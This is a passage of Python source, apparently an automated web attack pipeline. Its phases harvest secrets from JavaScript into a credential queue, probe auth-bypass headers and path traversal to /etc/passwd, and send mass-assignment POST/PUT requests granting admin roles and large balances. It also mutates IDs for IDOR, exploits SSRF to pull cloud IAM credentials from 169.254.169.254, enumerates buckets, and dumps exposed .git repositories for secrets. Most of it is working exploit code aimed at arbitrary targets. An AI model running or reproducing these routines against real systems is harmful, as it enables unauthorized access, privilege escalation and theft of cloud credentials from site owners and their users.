    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Clean up raw JS and intermediate gitleaks files
    for p in outdir.glob("js_raw_*.js"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("gitleaks_*.json"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("trufflehog_*.txt"):
        p.unlink(missing_ok=True)
    log("ok", f"15-SECRETS: {len(findings)} deep JS findings → {out}")
    # Push found credentials into the shared credential queue for downstream phases
    cred_patterns = re.compile(r"(?i)(api[_-]?key|secret|token|password|jwt|bearer|auth)", re.IGNORECASE)
    for f in findings:
        if cred_patterns.search(f):
            _PIPELINE_CFG.credentials_queue.append(f)
    if _PIPELINE_CFG.credentials_queue:
        log("info", f"15-SECRETS: {len(_PIPELINE_CFG.credentials_queue)} potential credentials added to testing queue")
    return {"15-SECRETS": str(out), "count": len(findings)}


# ─────────────── Phase 16-AUTHZ: auth bypass + mass assignment ─────────────────────
_AUTH_BYPASS_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Scheme",
    "X-Real-IP",
    "Client-IP",
    "X-Custom-IP-Authorization",
    "X-Auth-Token",
    "X-Auth-User",
    "Authorization: Basic YWRtaW46YWRtaW4=",
]
_AUTH_METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "X-HTTP-Method-Override: POST",
    "X-HTTP-Method-Override: PUT",
    "X-HTTP-Method-Override: PATCH",
    "X-HTTP-Method-Override: DELETE",
]
_MASS_ASSIGN_FIELDS = [
    "admin",
    "is_admin",
    "role",
    "roles",
    "permissions",
    "is_teacher",
    "is_student",
    "group",
    "user_type",
    "balance",
    "points",
    "score",
    "grade",
    "completed",
    "approved",
    "verified",
    "active",
    "enabled",
    "plan",
    "tier",
    "subscription",
]


async def phase_16a_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"16a-AUTHZ"}:
        return {}
    _l_out = outdir / "authz_bypass.txt"
    if _l_out.exists() and not force:
        return {"16a-AUTHZ": str(_l_out), "count": count_nonblank(_l_out)}
    log("info", "Phase 16a-AUTHZ: auth bypass headers + method override + CORS checks")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    # 1. Collect API-like endpoints from urls_all.txt + ffuf output
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                (
                    "/api",
                    "/account",
                    "/login",
                    "/register",
                    "/password",
                    "/user",
                    "/admin",
                    "/graphql",
                )
            ):
                api_endpoints.add(u)
    # Also check ffuf output for 200/301/302/403 endpoints
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        # Fall back to first 10 urls
        api_endpoints = set(read_lines(urls)[:_PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
    if not api_endpoints:
        log("warn", "16a-AUTHZ: no endpoints found; skipping")
        return {"16a-AUTHZ": str(outdir / "authz_bypass.txt"), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    for ep in sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
        findings.append(f"  endpoint={ep}")
    # 2. qsreplace parameter pollution testing
    if t.has("qsreplace") and sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
        qsreplace_in = ensure(outdir / "urls_qsreplace.txt")
        qsreplace_in.write_text(
            "\n".join(sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]) + "\n"
        )
        qsreplace_out = outdir / "qsreplace_results.txt"
        runner = outdir / "logs" / "qsreplace_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(qsreplace_in))}\n"
            f"OUT={shlex.quote(str(qsreplace_out))}\n"
            'cat "$IN" | qsreplace "evil" > "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run(
            "qsreplace",
            ["bash", str(runner)],
            300, outdir,
        )
        if qsreplace_out.exists() and read_lines(qsreplace_out):
            for ln in read_lines(qsreplace_out)[:20]:
                findings.append(f"  [qsreplace] {ln}")
    # 3. Auth bypass header probes (non-destructive, concurrent)
    bypass_found: List[str] = []
    targets = sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]

    async def _check_bypass(ep: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(ep, method="GET")
            baseline_status, _, baseline_body = await _async_urlopen(_l_urlopen, base_req, timeout=8)
            baseline_len = len(baseline_body)
        except Exception:
            return results
        for hdr in _AUTH_BYPASS_HEADERS:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET")
                if ":" in hdr:
                    k, v = hdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                elif hdr in ("X-Original-URL", "X-Rewrite-URL"):
                    req.add_header(hdr, "/admin")
                elif hdr in ("X-Auth-Token", "X-Auth-User"):
                    req.add_header(hdr, "admin")
                elif hdr == "X-Custom-IP-Authorization":
                    req.add_header(hdr, "127.0.0.1")
                elif hdr == "Authorization: Basic YWRtaW46YWRtaW4=":
                    req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
                else:
                    req.add_header(hdr, "127.0.0.1")
                probe_status, _, probe_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                probe_len = len(probe_body)
                # Different status code → potential bypass
                if probe_status != baseline_status and probe_status in (200, 302, 403, 401):
                    results.append(
                        f"  bypass={hdr} → {probe_status} (baseline={baseline_status}) on {ep}"
                    )
                    break
                # Same status code but significantly different body length → may indicate
                # different content being served (e.g. admin panel vs login page)
                if (probe_status == baseline_status
                        and probe_len
                        and abs(probe_len - baseline_len) > max(100, baseline_len * 0.1)):
                    results.append(
                        f"  bypass_body_diff={hdr} (status={probe_status}, len={probe_len}, baseline_len={baseline_len}) on {ep}"
                    )
            except Exception:
                continue
        return results

    bypass_results = await asyncio.gather(*[_check_bypass(ep) for ep in targets])
    for br in bypass_results:
        bypass_found.extend(br)

    # 3a. HTTP method override probes (concurrent)
    method_override_findings: List[str] = []
    async def _check_method_override(ep: str) -> List[str]:
        results: List[str] = []
        for ohdr in _AUTH_METHOD_OVERRIDE_HEADERS:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
                if ":" in ohdr:
                    k, v = ohdr.split(":", 1)
                    req.add_header(k.strip(), v.strip())
                else:
                    req.add_header(ohdr, "POST")
                override_status, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
                if override_status in (200, 201, 302, 403, 405, 500):
                    results.append(f"  method_override={ohdr} → {override_status} on {ep}")
            except Exception:
                continue
        return results
    mo_results = await asyncio.gather(*[_check_method_override(ep) for ep in targets])
    for mr in mo_results:
        method_override_findings.extend(mr)

    # 3b. X-Original-URL path traversal probes
    xou_findings: List[str] = []
    async def _check_xou_traversal(ep: str) -> List[str]:
        results: List[str] = []
        for path in ["/admin", "/../admin", "/%2e%2e/admin", "/..;/admin", "/../../etc/passwd"]:
            await _throttle_rate()
            try:
                req = urllib.request.Request(ep, method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "X-Original-URL": path})
                xou_status, _, xou_body = await _async_urlopen(_l_urlopen, req, timeout=8)
                if xou_status in (200, 201, 302, 403):
                    results.append(f"  xou_traversal=X-Original-URL: {path} → {xou_status} on {ep}")
            except Exception:
                continue
        return results
    xou_results = await asyncio.gather(*[_check_xou_traversal(ep) for ep in targets])
    for xr in xou_results:
        xou_findings.extend(xr)

    findings.append("auth_bypass_probes:")
    findings.extend(bypass_found or ["  none detected (expected)"])
    if method_override_findings:
        findings.append("method_override_probes:")
        findings.extend(method_override_findings)
    if xou_findings:
        findings.append("xou_traversal_probes:")
        findings.extend(xou_findings)
    # 4. Basic CORS misconfiguration check (origin reflection)
    cors_findings: List[str] = []

    async def _check_cors(ep: str) -> Optional[str]:
        try:
            req = urllib.request.Request(ep, method="GET")
            req.add_header("Origin", "https://evil.example.com")
            _, cors_headers, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
            acao = cors_headers.get("Access-Control-Allow-Origin", "")
            acac = cors_headers.get("Access-Control-Allow-Credentials", "")
            if "*" in acao or "evil.example.com" in acao:
                return f"  cors_origin_reflection=YES (ACAO={acao}, ACAC={acac}) on {ep}"
        except Exception:
            pass
        return None

    cors_results = await asyncio.gather(*[_check_cors(ep) for ep in targets[:_PIPELINE_CFG.sample_endpoints_cors]])
    for r in cors_results:
        if r:
            cors_findings.append(r)
    if cors_findings:
        findings.append("cors_checks:")
        findings.extend(cors_findings)
    out = ensure(outdir / "authz_bypass.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"16a-AUTHZ: {len(findings)} auth bypass findings → {out}")
    return {"16a-AUTHZ": str(out), "count": len(findings)}


async def phase_16b_MASSASSIGN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"16b-MASSASSIGN"}:
        return {}
    _out = outdir / "mass_assign.txt"
    if _out.exists() and not force:
        return {"16b-MASSASSIGN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 16b-MASSASSIGN: mass assignment probes via POST/PUT")
    findings: List[str] = []
    _ma_urlopen = _get_urlopener()
    urls = outdir / "urls_all.txt"
    api_endpoints: Set[str] = set()
    if urls.exists():
        for u in _dedupe_by_host_path(read_lines(urls)):
            path = u.split("?")[0].split("#")[0].lower()
            if "/api/" in path or path.endswith(
                ("/api", "/account", "/login", "/register", "/password", "/user", "/admin", "/graphql")
            ):
                api_endpoints.add(u)
    for ff in outdir.glob("ffuf_*.txt"):
        if ff.exists() and ff.name != "fuzz.txt":
            for ln in read_lines(ff):
                parts = ln.split("\t", 1)
                if len(parts) == 2:
                    api_endpoints.add(parts[1])
    if not api_endpoints:
        api_endpoints = set(read_lines(urls)[:_PIPELINE_CFG.sample_endpoints_l]) if urls.exists() else set()
    if not api_endpoints:
        log("warn", "16b-MASSASSIGN: no endpoints found; skipping")
        return {"16b-MASSASSIGN": str(_out), "count": 0}
    findings.append(f"target_endpoints={len(api_endpoints)}")
    _MASS_ASSIGN_VALUES: Dict[str, object] = {
        "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
        "permissions": ["admin"], "is_teacher": True, "is_student": True,
        "group": "admin", "user_type": "admin", "plan": "enterprise", "tier": "premium",
        "subscription": "premium", "balance": 999999, "points": 999999,
        "score": 999999, "grade": "A+", "completed": True, "approved": True,
        "verified": True, "active": True, "enabled": True,
    }
    post_targets = [ep for ep in sorted(api_endpoints)[:_PIPELINE_CFG.sample_endpoints_post] if "?" not in ep.split("#")[0]]

    async def _check_mass_assignment(ep: str) -> List[str]:
        results: List[str] = []
        for field in _MASS_ASSIGN_FIELDS[:_PIPELINE_CFG.sample_endpoints_post]:
            await _throttle_rate()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(ep, data=body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                post_status, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                if post_status in (200, 201, 302):
                    results.append(f"  POST {ep} {{{field}: {json.dumps(val)}}} → {post_status}")
            except Exception:
                continue
        return results

    async def _check_mass_assignment_put(ep: str) -> List[str]:
        results: List[str] = []
        for field in _MASS_ASSIGN_FIELDS[:_PIPELINE_CFG.sample_endpoints_post]:
            await _throttle_rate()
            val = _MASS_ASSIGN_VALUES.get(field, True)
            body = json.dumps({field: val}).encode()
            try:
                req = urllib.request.Request(ep, data=body, method="PUT",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                put_status, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                if put_status in (200, 201, 302):
                    results.append(f"  PUT {ep} {{{field}: {json.dumps(val)}}} → {put_status}")
            except Exception:
                continue
        return results

    post_results = await asyncio.gather(*[_check_mass_assignment(ep) for ep in post_targets])
    for pr in post_results:
        findings.extend(pr)
    put_results = await asyncio.gather(*[_check_mass_assignment_put(ep) for ep in post_targets])
    for pr in put_results:
        findings.extend(pr)
    if not findings or len(findings) == 1:
        findings.append("[result] No mass assignment vulnerabilities detected")
    findings.append("mass_assignment_fields_tested:")
    findings.extend([f"  {f}" for f in _MASS_ASSIGN_FIELDS])
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"16b-MASSASSIGN: {len(findings)} findings → {out}")
    return {"16b-MASSASSIGN": str(_out), "count": len(findings)}


async def phase_17_IDOR(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"17-IDOR"}:
        return {}
    _out = outdir / "idor.txt"
    if _out.exists() and not force:
        return {"17-IDOR": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 17-IDOR: systematic ID manipulation testing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    params_file = outdir / "params.txt"
    all_urls: List[str] = []
    if urls_file.exists():
        all_urls = read_lines(urls_file)
    if params_file.exists():
        all_urls.extend(read_lines(params_file))
    all_urls = _dedupe_by_host_path(all_urls)
    if not all_urls:
        log("warn", "17-IDOR: no URLs or params available; skipping")
        return {"17-IDOR": str(_out), "count": 0}
    # Identify ID-bearing parameters
    id_params = ["id", "user_id", "account_id", "customer_id", "profile_id",
                 "uid", "uuid", "guid", "token", "reference", "order_id",
                 "transaction_id", "invoice_id", "document_id", "file_id",
                 "app_id", "org_id", "group_id", "role_id", "permission_id"]
    id_urls = [u for u in all_urls if any(p + "=" in u.lower() for p in id_params)][:_PIPELINE_CFG.sample_urls_idor]
    if not id_urls:
        # Fall back to any param-bearing URLs
        id_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_idor]
    if not id_urls:
        log("warn", "17-IDOR: no parameter-bearing URLs; skipping")
        return {"17-IDOR": str(_out), "count": 0}
    findings.append(f"target_urls={len(id_urls)}")
    # Helper to switch UUIDs between test accounts
    known_uuids = ["00000000-0000-0000-0000-000000000000",
                   "11111111-1111-1111-1111-111111111111",
                   "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"]
    async def _probe_idor(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        # Baseline request
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers})
            base_status, _, base_body = await _async_urlopen(_id_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except Exception:
            return results
        for pname in qs:
            if not any(idp in pname.lower() for idp in ["id", "uid", "uuid", "account", "user", "customer", "profile"]):
                continue
            orig_val = qs[pname][0]
            mutations: List[str] = []
            # Numeric increment/decrement
            if orig_val.isdigit():
                mutations.append(str(int(orig_val) + 1))
                mutations.append(str(max(0, int(orig_val) - 1)))
                mutations.append("1")
                mutations.append("999999")
            elif len(orig_val) == 36 and orig_val.count("-") == 4:
                # Looks like a UUID: try known UUIDs
                mutations.extend(known_uuids)
                # Try swapping first group
                parts = orig_val.split("-")
                if len(parts) == 5:
                    mutations.append("-".join(["00000000"] + parts[1:]))
                    mutations.append("-".join(["11111111"] + parts[1:]))
            # Sequential/predictable mutations
            mutations.append("0")
            mutations.append("1")
            mutations.append("-1")
            # Deduplicate to avoid sending the same mutation twice
            mutations = list(dict.fromkeys(mutations))
            for mutation in mutations[:_PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [mutation]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_id_extra_headers})
                    test_status, _, test_body = await _async_urlopen(_id_urlopen, req, timeout=10)
                    test_len = len(test_body)
                    # IDOR indicators: same status as baseline but different content,
                    # or status 200 when baseline was 403/401 (unauthorized access)
                    if test_status == 200 and base_status in (401, 403):
                        results.append(f"[idor] {test_url} → HTTP {test_status} (baseline={base_status}) — privilege escalation")
                    elif test_status == base_status and test_len > 0 and base_len > 0 and abs(test_len - base_len) > max(200, base_len * 0.2):
                        results.append(f"[idor-candidate] {test_url} → HTTP {test_status} len={test_len} (baseline={base_status}/{base_len})")
                except Exception:
                    continue
        return results
    probe_results = await asyncio.gather(*[_probe_idor(u) for u in id_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No IDOR vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"17-IDOR: {len(findings)} findings → {out}")
    return {"17-IDOR": str(_out), "count": len(findings)}


async def phase_17b_SSRFMETA(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"17b-SSRFMETA"}:
        return {}
    _out = outdir / "ssrf_meta.txt"
    if _out.exists() and not force:
        return {"17b-SSRFMETA": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 17b-SSRFMETA: cloud metadata exfiltration via confirmed SSRF")
    findings: List[str] = []
    _ss_urlopen = _get_urlopener()
    _ss_extra_headers = _extra_headers_dict()
    # Read SSRF candidates from vulns.txt and url_ssrf.txt
    vulns_file = outdir / "vulns.txt"
    ssrf_urls_file = outdir / "urls_ssrf.txt"
    ssrf_candidates: List[str] = []
    if vulns_file.exists():
        for ln in read_lines(vulns_file):
            if "ssrf" in ln.lower():
                # Extract URL from line
                for token in ln.split():
                    if token.startswith("http"):
                        ssrf_candidates.append(token)
                        break
    if ssrf_urls_file.exists():
        ssrf_candidates.extend(read_lines(ssrf_urls_file))
    ssrf_candidates = _dedupe_by_host_path(ssrf_candidates)
    if not ssrf_candidates:
        log("warn", "17b-SSRFMETA: no SSRF candidates found; skipping")
        return {"17b-SSRFMETA": str(_out), "count": 0}
    findings.append(f"ssrf_candidates={len(ssrf_candidates)}")
    # Cloud metadata IPs and paths
    cloud_targets = [
        # AWS
        ("AWS", "http://169.254.169.254/latest/meta-data/"),
        ("AWS", "http://169.254.169.254/latest/user-data/"),
        ("AWS", "http://169.254.169.254/latest/credentials/"),
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        # GCP
        ("GCP", "http://169.254.169.254/computeMetadata/v1/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        # Azure
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Azure", "http://100.100.100.200/metadata/instance?api-version=2021-02-01"),
        # Alibaba Cloud / others
        ("AliCloud", "http://100.100.100.200/latest/meta-data/"),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1.json"),
    ]
    for cand in ssrf_candidates[:_PIPELINE_CFG.sample_urls_fuzz]:
        parsed = urllib.parse.urlparse(cand)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for pname in qs:
            # Only test parameters that look like URL/redirect parameters
            if not any(k in pname.lower() for k in ("url", "uri", "path", "dest", "redirect", "target", "site", "host", "domain", "load", "fetch", "proxy", "image", "img")):
                continue
            for cloud_name, meta_url in cloud_targets:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [meta_url]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers})
                    meta_status, meta_headers, meta_body = await _async_urlopen(_ss_urlopen, req, timeout=15)
                    meta_text = meta_body.decode("utf-8", errors="ignore")
                    # If we got data back that looks like cloud metadata
                    if meta_status == 200 and len(meta_text) > 20:
                        findings.append(f"[credential-exfil] {cloud_name} via {test_url}")
                        findings.append(f"  status={meta_status} body_length={len(meta_text)}")
                        # Extract sensitive patterns
                        for secret_pattern in ["accesskey", "secretkey", "token", "password", "private_key", "ssh"]:
                            for line in meta_text.splitlines():
                                if secret_pattern in line.lower():
                                    findings.append(f"  [secret] {line[:200]}")
                        # Save full response for evidence
                        meta_out = ensure(outdir / "ssrf_meta_raw" / f"{_safe_name(cloud_name)}_{_safe_name(pname)}.txt")
                        meta_out.write_text(meta_text)
                except Exception:
                    continue
    if not findings:
        findings.append("[result] No cloud metadata exfiltration achieved")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"17b-SSRFMETA: {len(findings)} findings → {out}")
    return {"17b-SSRFMETA": str(_out), "count": len(findings)}


# ────────────────── Phase 18-CLOUD: Cloud Bucket Discovery ───────────────────
_CLOUD_PROVIDERS: List[Dict[str, Any]] = [
    {"name": "AWS", "domain": "s3.amazonaws.com", "fmt": "{bucket}.s3.amazonaws.com"},
    {"name": "GCP", "domain": "storage.googleapis.com", "fmt": "{bucket}.storage.googleapis.com"},
    {"name": "Azure", "domain": "blob.core.windows.net", "fmt": "{bucket}.blob.core.windows.net"},
    {"name": "DO", "domain": "digitaloceanspaces.com", "fmt": "{bucket}.digitaloceanspaces.com"},
]
_CLOUD_BUCKET_KEYWORDS = [
    "backup", "assets", "media", "uploads", "data", "files", "static",
    "cdn", "downloads", "public", "private", "prod", "dev", "staging",
    "test", "logs", "config", "deploy", "bucket", "storage", "backups",
    "archive", "images", "videos", "docs", "resources", "temp",
]


async def phase_18_CLOUD(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"18-CLOUD"}:
        return {}
    _m_out = outdir / "cloud_buckets.txt"
    if _m_out.exists() and not force:
        return {"18-CLOUD": str(_m_out), "count": count_nonblank(_m_out)}
    log("info", "Phase 18-CLOUD: cloud bucket discovery")
    findings: List[str] = []
    _m_urlopen = _get_urlopener()
    seen_buckets: Set[str] = set()
    # Build candidate bucket names from domain + common keywords
    base = domain.split(".")[0] if "." in domain else domain
    candidates: Set[str] = set()
    candidates.add(base)
    candidates.add(domain.replace(".", "-"))
    candidates.add(domain.replace(".", ""))
    for kw in _CLOUD_BUCKET_KEYWORDS:
        candidates.add(f"{base}-{kw}")
        candidates.add(f"{base}{kw}")
        candidates.add(f"{kw}-{base}")
        candidates.add(f"{domain}-{kw}")
    # Trim to configured sample size
    candidate_list = sorted(candidates)[:_PIPELINE_CFG.sample_hosts_cloud * 10]
    # If cloud_enum is available and working, use it as the primary scanner
    if t.has("cloud_enum") and t.verify("cloud_enum", ["--help"]):
        cloud_in = ensure(outdir / "cloud_enum_domains.txt")
        cloud_in.write_text(domain + "\n")
        cloud_out = outdir / "cloud_enum_raw.txt"
        await _run(
            "cloud_enum",
            ["cloud_enum", "-k", domain, "-l", str(cloud_out), "-qs"],
            600, outdir,
        )
        if cloud_out.exists():
            findings.append(f"[cloud_enum] results → {cloud_out}")
    # CloudFox cloud enumeration
    if t.has("cloudfox"):
        cloudfox_outdir = outdir / "cloudfox_results"
        cloudfox_outdir.mkdir(parents=True, exist_ok=True)
        runner = outdir / "logs" / "cloudfox_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"DOMAIN={shlex.quote(domain)}\n"
            f"OUT={shlex.quote(str(cloudfox_outdir))}\n"
            '# Try common AWS profiles; silently skip if no credentials\n'
            'for profile in default dev staging prod; do\n'
              '  cloudfox aws -p "$profile" --outdir "$OUT" all\n'
            'done\n'
        )
        runner.chmod(0o700)
        await _run("cloudfox", ["bash", str(runner)], 600, outdir)
        reports = list(cloudfox_outdir.glob("**/*.txt"))
        if reports:
            findings.append(f"[cloudfox] {len(reports)} report files → {cloudfox_outdir}")
    # Python-based bucket probing
    async def _probe_bucket(bucket: str) -> List[str]:
        results: List[str] = []
        for provider in _CLOUD_PROVIDERS:
            url = f"http://{provider['fmt'].format(bucket=bucket)}"
            key = f"{provider['name']}:{url}"
            if key in seen_buckets:
                continue
            seen_buckets.add(key)
            try:
                req = urllib.request.Request(url, method="HEAD",
                    headers={"User-Agent": "Mozilla/5.0"})
                bucket_status, _, _ = await _async_urlopen(_m_urlopen, req, timeout=10)
                if bucket_status in (200, 301, 302, 403):
                    results.append(f"[{provider['name']}] {url} (HTTP {bucket_status})")
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_bucket(c) for c in candidate_list])
    for pr in probe_results:
        findings.extend(pr)
    out = ensure(_m_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 18-CLOUD: {len(findings)} cloud bucket findings → {out}")
    return {"18-CLOUD": str(out), "count": len(findings)}


# ────────────────── Phase 19-GIT: Git Exposure Scanning ──────────────────────
_GIT_PATHS = [
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/.git/",
    "/git/config",
    "/.svn/entries",
]
_GIT_COMMON_REFS = [
    "refs/heads/master",
    "refs/heads/main",
    "refs/heads/dev",
    "refs/heads/develop",
]


async def phase_19_GIT(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"19-GIT"}:
        return {}
    _n_out = outdir / "git_exposure.txt"
    if _n_out.exists() and not force:
        return {"19-GIT": str(_n_out), "count": count_nonblank(_n_out)}
    log("info", "Phase 19-GIT: git exposure scanning")
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    # Collect targets: HTTP hosts from 04-SCAN or raw resolved hosts
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_git]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "Phase 19-GIT: no HTTP targets; skipping")
        return {"19-GIT": str(_n_out), "count": 0}
    # Check for exposed .git directories (use no-redirect to avoid false positives)
    _no_redirect_urlopen = _get_no_redirect_urlopener()
    async def _check_git(url: str) -> List[str]:
        results: List[str] = []
        for git_path in _GIT_PATHS:
            test_url = f"{url}{git_path}"
            try:
                req = urllib.request.Request(test_url, method="HEAD",
                    headers={"User-Agent": "Mozilla/5.0"})
                git_status, _, _ = await _async_urlopen(_no_redirect_urlopen, req, timeout=10)
                if git_status == 200:
                    results.append(f"[.git-exposed] {test_url} (HTTP {git_status})")
                    break
            except urllib.error.HTTPError as e:
                if e.code in (200, 301, 302):
                    results.append(f"[.git-exposed] {test_url} (HTTP {e.code})")
                    break
            except Exception:
                continue
        # If .git is exposed, try to download it
        if results and t.has("gitdumper"):
            git_base = url.rstrip("/") + "/.git/"
            dump_dir = outdir / f"git_dump_{safe_suffix(url)}"
            dump_dir.mkdir(parents=True, exist_ok=True)
            await _run(
                f"gitdumper-{_safe_name(url)}",
                ["gitdumper", git_base, str(dump_dir)],
                300, outdir,
            )
            if dump_dir.exists() and list(dump_dir.iterdir()):
                results.append(f"[git-dumped] {git_base} → {dump_dir}")
                # Run trufflehog on the dumped repo
                if t.has("trufflehog"):
                    truffle_out = outdir / f"trufflehog_{safe_suffix(url)}.txt"
                    runner = outdir / "logs" / f"trufflehog_{safe_suffix(url)}.sh"
                    ensure(runner)
                    runner.write_text(
                        "#!/usr/bin/env bash\n"
                        "set -eu\n"
                        f"DIR={shlex.quote(str(dump_dir))}\n"
                        f"OUT={shlex.quote(str(truffle_out))}\n"
                        'trufflehog filesystem "$DIR" --no-verification > "$OUT"\n'
                    )
                    runner.chmod(0o700)
                    await _run(
                        f"trufflehog-{_safe_name(url)}",
                        ["bash", str(runner)], 600, outdir,
                    )
                    if truffle_out.exists() and read_lines(truffle_out):
                        results.append(f"[trufflehog] secrets found → {truffle_out}")
        return results

    git_results = await asyncio.gather(*[_check_git(t) for t in targets])
    for gr in git_results:
        findings.extend(gr)
    out = ensure(_n_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 19-GIT: {len(findings)} git exposure findings → {out}")
    return {"19-GIT": str(out), "count": len(findings)}


# ────────────────── Phase 20-GRAPHQL: GraphQL Introspection ──────────────────


async def _gql_precheck(url: str, timeout: int = 10) -> bool:
    """Quick probe: POST a minimal GraphQL query and check for GraphQL-like response.
    Returns True if the endpoint likely speaks GraphQL."""
    probe_query = '{"query":"{ __typename }"}'
    try:
        req = urllib.request.Request(
            url, method="POST",
            data=probe_query.encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        opener = _get_urlopener()
        status, headers, body_bytes = await _async_urlopen(opener, req, timeout=timeout)
        if status != 200:
            return False
        # Require JSON content-type to avoid false positives from HTML error pages
